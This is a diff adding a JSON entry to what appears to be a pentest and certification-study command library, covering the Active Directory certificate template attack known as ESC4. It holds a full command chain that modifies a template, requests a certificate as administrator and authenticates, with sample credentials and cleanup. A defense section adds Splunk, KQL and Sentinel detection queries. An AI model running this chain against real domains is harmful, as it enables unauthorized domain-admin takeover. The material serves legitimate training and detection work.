@@ -1,0 +1,100 @@
+{
+  "id": "ad-adcs-esc4-template-modify",
+  "name": "ADCS ESC4 - Certificate Template Modification",
+  "command": "modifyCertTemplate.py <domain>/<user>:<pass> -template <vuln_template> -add enrollee_supplies_subject -dc-ip <dc_ip>",
+  "description": "ESC4 exploits write access (GenericWrite/WriteDACL/WriteProperty) to a certificate template. An attacker modifies the template to enable Subject Alternative Name (SAN), turning it into an ESC1-vulnerable template, then requests a certificate impersonating a Domain Admin.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ADCS Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "SpecterOps Certified Pre-Owned; CRTP ADCS module",
+  "tags": [
+    "adcs",
+    "esc4",
+    "template-modification",
+    "writeproperty",
+    "san",
+    "certificate-template"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CONDITIONS ===\n1. User has write access to a certificate template\n   (GenericWrite, WriteDACL, WriteProperty, WriteOwner)\n2. The template is published on a CA\n3. Template allows client authentication EKU\n\n=== FIND WRITABLE TEMPLATES ===\n  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -vulnerable -stdout\n  # Look for ESC4 in output\n  # Or check ACLs manually with PowerView:\n  Get-ADObject -Filter {objectClass -eq \"pKICertificateTemplate\"} | ForEach-Object {\n    Get-Acl \"AD:\\$($_.DistinguishedName)\" | Select-Object -ExpandProperty Access\n  }\n\n=== ATTACK CHAIN ===\n  # Step 1: Save original template (for cleanup)\n  modifyCertTemplate.py <domain>/<user>:<pass> -template <vuln_template> -get-acl -dc-ip <dc_ip>\n\n  # Step 2: Modify template to allow SAN\n  modifyCertTemplate.py <domain>/<user>:<pass> -template <vuln_template> -add enrollee_supplies_subject -dc-ip <dc_ip>\n\n  # Step 3: Request cert with SAN (now ESC1)\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -upn administrator@<domain> -dc-ip <dc_ip>\n\n  # Step 4: Authenticate\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n  # Step 5: CLEANUP - restore template\n  modifyCertTemplate.py <domain>/<user>:<pass> -template <vuln_template> -remove enrollee_supplies_subject -dc-ip <dc_ip>\n\n=== ALTERNATIVE: ADCSTemplate ===\n  # PowerShell:\n  Set-ADCSTemplate -DisplayName <template> -Identity <domain>\\<user> -Setting enrollee_supplies_subject",
+  "examples": [
+    {
+      "label": "Find writable templates",
+      "command": "certipy find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -vulnerable -stdout"
+    },
+    {
+      "label": "Enable SAN on template",
+      "command": "modifyCertTemplate.py corp.local/jdoe:Password123 -template VulnTemplate -add enrollee_supplies_subject -dc-ip 192.168.1.10"
+    },
+    {
+      "label": "Request cert as admin",
+      "command": "certipy req -u jdoe@corp.local -p Password123 -ca corp-CA -template VulnTemplate -upn administrator@corp.local -dc-ip 192.168.1.10"
+    }
+  ],
+  "references": [
+    {
+      "title": "SpecterOps - Certified Pre-Owned",
+      "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+    },
+    {
+      "title": "modifyCertTemplate",
+      "url": "https://github.com/fortalice/modifyCertTemplate"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-esc1-certipy-linux",
+      "note": "ESC1 is what the template becomes after ESC4 modification.",
+      "rel": "next"
+    },
+    {
+      "id": "ad-adcs-esc2-any-purpose",
+      "note": "ESC2 is another template misconfiguration (Any Purpose EKU).",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Certificate templates are AD objects with ACLs. If a user has write access, they can modify the template properties to enable Subject Alternative Name, which allows requesting certificates for any user.",
+    "prerequisites": "Write access (GenericWrite/WriteDACL/WriteProperty) to a published certificate template.",
+    "impact": "Domain compromise by impersonating Domain Admin via modified certificate template.",
+    "detection": "[MITRE T1649] Certificate template modification events; template ACL changes; enrollment after template change.",
+    "artifacts": "Event 4899 (template modified); LDAP writes to pKICertificateTemplate objects; certificate request shortly after template change.",
+    "splunk_spl": "index=windows EventCode=5136 ObjectClass=\"pKICertificateTemplate\"\n| where AttributeLDAPDisplayName IN (\"msPKI-Certificate-Name-Flag\", \"msPKI-Enrollment-Flag\")\n| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+    "elastic_kql": "event.code:\"5136\" AND winlog.event_data.ObjectClass:\"pKICertificateTemplate\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where ObjectClass == \"pKICertificateTemplate\"\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+    "sigma_rules": "win_security_adcs_esc4_template_modification",
+    "prevention": "Restrict write access to certificate templates; monitor template modifications; use template version tracking; alert on any template property changes.",
+    "sources": [
+      "SpecterOps research",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "ESC4 - Certificate template modification",
+        "logic": "SecurityEvent\n| where EventID == 5136\n| where ObjectClass == \"pKICertificateTemplate\"\n| where AttributeLDAPDisplayName has_any (\"msPKI-Certificate-Name-Flag\", \"msPKI-Enrollment-Flag\", \"msPKI-RA-Signature\")\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5136"
+        ],
+        "attack": [
+          "T1649"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate PKI administrator template changes",
+        "tuning": "Any non-PKI-admin modifying certificate template flags is extremely suspicious"
+      }
+    ]
+  }
+}
